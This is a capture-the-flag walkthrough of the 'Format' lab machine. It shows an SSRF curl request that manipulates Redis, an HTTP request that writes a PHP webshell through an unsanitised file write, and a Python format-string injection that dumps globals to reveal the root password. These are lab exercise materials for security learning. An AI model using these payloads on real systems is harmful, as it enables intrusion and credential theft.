# Format

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.86.64 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 03:41 EDT
Nmap scan report for 10.129.86.64
Host is up (0.16s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```

We have to add `app.microblog.htb` and `microblog.htb` to our `/etc/hosts` file to view port 80.&#x20;

### Microblog --> Blog Creation

Port 80 reveals a blogging service called Microblog:

<figure><img src="../../.gitbook/assets/image (2075).png" alt=""><figcaption></figcaption></figure>

At the bottom, it appears that the website creates new blogs by using new subdomains.

<figure><img src="../../.gitbook/assets/image (987).png" alt=""><figcaption></figcaption></figure>

By clicking on Contrubute Here, we are redirected to port 3000 that hosts a Gitea instance with some source code:

<figure><img src="../../.gitbook/assets/image (928).png" alt=""><figcaption></figcaption></figure>

Before going there, let's take a look at the rest of the website. After registering a user, it seems that we can 'create' a subdomain:

<figure><img src="../../.gitbook/assets/image (611).png" alt=""><figcaption></figcaption></figure>

After creating one, we can edit it.

<figure><img src="../../.gitbook/assets/image (1736).png" alt=""><figcaption></figcaption></figure>

Going to the edit page reveals that we can use h1 or txt.

<figure><img src="../../.gitbook/assets/image (1242).png" alt=""><figcaption></figcaption></figure>

This would send a POST request to `/edit/index.php`:

```http
POST /edit/index.php HTTP/1.1
Host: test.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://test.microblog.htb
Connection: close
Referer: http://test.microblog.htb/edit/
Cookie: username=1cl26pbf4ftqkk0s7i5ntv84iv
Upgrade-Insecure-Requests: 1



id=02nc8ktv0kk4&txt=test
```

### Sunny Code Review --> LFI

When checking the application, it seems that we have a `sunny` subdomain.

<figure><img src="../../.gitbook/assets/image (1049).png" alt=""><figcaption></figcaption></figure>

Witin the `sunny` directory, it seems that there is an `edit` function. The PHP code for this is pretty long, so let's break it down:

```php
$username = session_name("username");
session_set_cookie_params(0, '/', '.microblog.htb');
session_start();
if(file_exists("bulletproof.php")) {
    require_once "bulletproof.php";
}

if(is_null($_SESSION['username'])) {
    header("Location: /");
    exit;
}
```

This is standard session stuff, and it seems to use a `bulletproof.php`, which is an image uploader plugin.&#x20;

{% embed url="https://github.com/samayo/bulletproof" %}

The next part of the code seems to verify the users that owns a 'blog' and also checks if we are a Pro user. At the bottom of the code, there's a function that checks whether ourt user is 'Pro':

```php
function checkUserOwnsBlog() {
    $redis = new Redis();
    $redis->connect('/var/run/redis/redis.sock');
    $subdomain = array_shift((explode('.', $_SERVER['HTTP_HOST'])));
    $userSites = $redis->LRANGE($_SESSION['username'] . ":sites", 0, -1);
    if(!in_array($subdomain, $userSites)) {
        header("Location: /");
        exit;
    }
}

function provisionProUser() {
    if(isPro() === "true") {
        $blogName = trim(urldecode(getBlogName()));
        system("chmod +w /var/www/microblog/" . $blogName);
        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
    }
    return;
}


function isPro() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $pro = $redis->HGET($_SESSION['username'], "pro");
        return strval($pro);
    }
    return "false";
}
```

The Pro user is the target here, as it looks like command injection is possible. The last chunk of code has to do with the upload functions. Most of the functions are somewhat identical to each other, taking 2 POST parameters, with one being called `id`.&#x20;

```php
if (isset($_POST['header']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $html = "<div class = \"blog-h1 blue-fill\"><b>{$_POST['header']}</b></div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
    $order_file = fopen("order.txt", "a");
    fwrite($order_file, $_POST['id'] . "\n");  
    fclose($order_file);
    header("Location: /edit?message=Section added!&status=success");
}
```

In this case, it seems that the `id` parameter is directly passed into `fopen`, meaning this could be vulnerable to LFI. Earlier, we created a new blog which created a new subdomain, so let's test our vulnerability there and confirm that it works.

<figure><img src="../../.gitbook/assets/image (810).png" alt=""><figcaption></figcaption></figure>

```http
POST /edit/index.php HTTP/1.1
Host: test.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://test.microblog.htb
Connection: close
Referer: http://test.microblog.htb/edit/
Cookie: username=1cl26pbf4ftqkk0s7i5ntv84iv
Upgrade-Insecure-Requests: 1



id=/etc/passwd&header=test
```

This means that the code for new blogs are **all the same**. This means that the 'Pro' user portion is also present on our test blog. Also, it is worth noting that after a few minutes, our new blog and user is deleted from the browser as part of the cleanup script.

### App Code Review --> Find Path

Let's take a look at the main site that is creating new subdomains.&#x20;

```php
function addSite($site_name) {
    if(isset($_SESSION['username'])) {
        //check if site already exists
        $scan = glob('/var/www/microblog/*', GLOB_ONLYDIR);
        $taken_sites = array();
        foreach($scan as $site) {
            array_push($taken_sites, substr($site, strrpos($site, '/') + 1));
        }
        if(in_array($site_name, $taken_sites)) {
            header("Location: /dashboard?message=Sorry, that site has already been taken&status=fail");
            exit;
        }
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $redis->LPUSH($_SESSION['username'] . ":sites", $site_name);
        chdir(getcwd() . "/../../../");
        system("chmod +w microblog");
        chdir(getcwd() . "/microblog/");
        if(!is_dir($site_name)) {
            mkdir($site_name, 0700);
        }
        system("cp -r /var/www/microblog-template/* /var/www/microblog/" . $site_name);
        if(is_dir($site_name)) {
            chdir(getcwd() . "/" . $site_name);
        }
        system("chmod +w content");
        chdir(getcwd() . "/../");
        system("chmod 500 " . $site_name);
        chdir(getcwd() . "/../");
        system("chmod -w microblog");
        header("Location: /dashboard?message=Site added successfully!&status=success");
    }
    else {
        header("Location: /dashboard?message=Site not added, authentication failed&status=fail");
    }
}
```

It seems that when the new site is created, it is **writeable** for a while. Not sure what to do with this though.&#x20;

After looking through all the code, the 'Pro' user method seems to be the correct way. The ProUser method would allow us to use `bulletproof.php` to upload files, of which we can probably upload some kind of PHP reverse shell and execute it. Now, we need to find out how to manipulate the Redis database to make ourselves Pro.

### Redis Manipulation --> RCE

While researching possible exploits, I found that it was possible to use SSRF to manipulate the Redis database.&#x20;

{% embed url="https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/" %}

It is possible to set our session using SSRF using the HSET command on Redis. We can test this out by using this:

```bash
curl -X "HSET" http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:test123%20pro%20true%20a/b
```

Afterwards, if we create a website, we notice that we can upload Images:

<figure><img src="../../.gitbook/assets/image (2861).png" alt=""><figcaption></figcaption></figure>

Great! We are a Pro User and can upload files now. Since we are Pro, this chunk of code would be executed:

```php
function provisionProUser() {
    if(isPro() === "true") {
        $blogName = trim(urldecode(getBlogName()));
        system("chmod +w /var/www/microblog/" . $blogName);
        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
    }
    return;
}
```

This creates an `/uploads` directory and makes it **writeable**. This means that we can actually use the LFI to write a file. The reason this works is because of the code below:

```php
$html = "<div class = \"blog-h1 blue-fill\"><b>{$_POST['header']}</b></div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
```

The `header` parameter would have the contents of the PHP webshell, while the `id` parameter would have the full path of the file to be written since both are not sanitised. I used this HTTP request:

{% code overflow="wrap" %}
```http
POST /edit/index.php HTTP/1.1
Host: test.microblog.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Origin: http://test.microblog.htb
Connection: close
Referer: http://test.microblog.htb/edit/
Cookie: username=1cl26pbf4ftqkk0s7i5ntv84iv
Upgrade-Insecure-Requests: 1



id=/var/www/microblog/test/uploads/rev.php&txt=<%3fphp+system($_REQUEST['cmd'])%3b+%3f>
```
{% endcode %}

Afterwards, we can confirm we have RCE:

<figure><img src="../../.gitbook/assets/image (3973).png" alt=""><figcaption></figcaption></figure>

And then we can get a reverse shell:

<figure><img src="../../.gitbook/assets/image (3869).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Pspy --> Cooper Creds

Within the machine, if we run `pspy64`, we would eventually see this:

<figure><img src="../../.gitbook/assets/image (1554).png" alt=""><figcaption></figcaption></figure>

We can use these credentials to access the user via `ssh`.&#x20;

<figure><img src="../../.gitbook/assets/image (2015).png" alt=""><figcaption></figcaption></figure>

### Format String --> Root Creds

When we check `sudo` privileges, we can see the user can run a Python script:

```
cooper@format:~$ sudo -l
[sudo] password for cooper: 
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license
    
cooper@format:~$ file /usr/bin/license
/usr/bin/license: Python script, ASCII text executable
```

The script seems to do some stuff with Redis. First it checks whether the user is `root`, and some flags can be used. It does some string concatenation at the start too.&#x20;

```python
class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()

if os.geteuid() != 0:
    print("")
    print("Microblog license key manager can only be run as root")
    print("")
    sys.exit()

parser = argparse.ArgumentParser(description='Microblog license key manager')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
args = parser.parse_args()
```

Afterwards, it connects to the Redis database and uses a secret password to do so:

```python
r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')

secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))

f = Fernet(encryption_key)
l = License()
```

The provision function is the longest, and it does quite a few things.&#x20;

```python
if(args.provision):
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    print("")
    print("Plaintext license key:")
    print("------------------------------------------------------")
    print(license_key)
    print("")
    license_key_encoded = license_key.encode()
    license_key_encrypted = f.encrypt(license_key_encoded)
    print("Encrypted license key (distribute to customer):")
    print("------------------------------------------------------")
    print(license_key_encrypted.decode())
    print("")
    with open("/root/license/keys", "a") as license_keys_file:
        license_keys_file.write(args.provision + ":" + license_key_encrypted.decode() + "\n")
```

It seems to take a username parameter and then it checks if the user exists. Afterwards, it seems to create a license key for the user. This uses the `{license.license}` string to do so.

The `format()` string function is vulnerable to a few attacks, and the name of the box means that this is the intended method for PrivEsc. This gives rise to Format String Vulnerabilities:

{% embed url="https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/" %}

Perhaps we can use this to dump the `secret` variable that is used. Maybe that's a hash for the `root` user. First, we can create a new user called `user123` on the website and login to Redis on the machine to view it (use the socket file!):

```
cooper@format:~$ redis-cli -s /run/redis/redis.sock 
redis /run/redis/redis.sock> INFO keyspace
# Keyspace
db0:keys=4,expires=1,avg_ttl=1422098
redis /run/redis/redis.sock> select 0
OK
redis /run/redis/redis.sock> keys *
1) "cooper.dooper:sites"
2) "user123"
3) "PHPREDIS_SESSION:1cl26pbf4ftqkk0s7i5ntv84iv"
4) "cooper.dooper"
```

Afterwards, when we run the `license` program, we get the License Key:

```
cooper@format:~$ sudo /usr/bin/license -p user123
                                                                                             
Plaintext license key:                                                                       
------------------------------------------------------
microbloguser123f2G^Um4L`])p=b\+sY$~|dZ|89xU/>;|S45tPM<Tuseruser

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABkYMlBQ1sk9EvGPaPlcepxtmQ6D8BtGYtNPEaZc9LNhpxA-LukIBYhtHwGtmhKpPXrfM29ncr8PwzAg1jXedSI61cT2BxMcE0iNDhx87fdoeUTDyy4uoOZ53QE9-NeDMwAUq6o2JjxAp29dFbPDC9cMBmrpVDNadtH_YyDCjuXa8LUEcY=
```

I first tried to use HSET to insert a user of our own choosing:

{% code overflow="wrap" %}
```
redis /run/redis/redis.sock> HSET testuser username testing username {self.__init__.__globals__} password {self.__init__.__globals__} first-name {self.__init__.__globals__} last-name {self.__init__.__globals__} pro false
(integer) 5

cooper@format:~$ sudo /usr/bin/license -ptestuser
Traceback (most recent call last):
  File "/usr/bin/license", line 65, in <module>
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
KeyError: 'self'
```
{% endcode %}

We can see that this is making an error occur within the script. We can see that the `format()` function uses `license=l`, so we can use that to dump the script's global context out:

{% code overflow="wrap" %}
```
redis /run/redis/redis.sock> HSET ee username {license.__init__.__globals__} password test first-name test last-name test pro false
(integer) 5

cooper@format:~$ sudo /usr/bin/license -p ee

Plaintext license key:
------------------------------------------------------
microblog{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f7d64b4fc10>
<TRUNCATED>
```
{% endcode %}

Within this entire string is the `root` password of :`unCR4ckaBL3Pa$$w0rd`. We can then `su` to `root`.

<figure><img src="../../.gitbook/assets/image (3194).png" alt=""><figcaption></figcaption></figure>

Rooted!
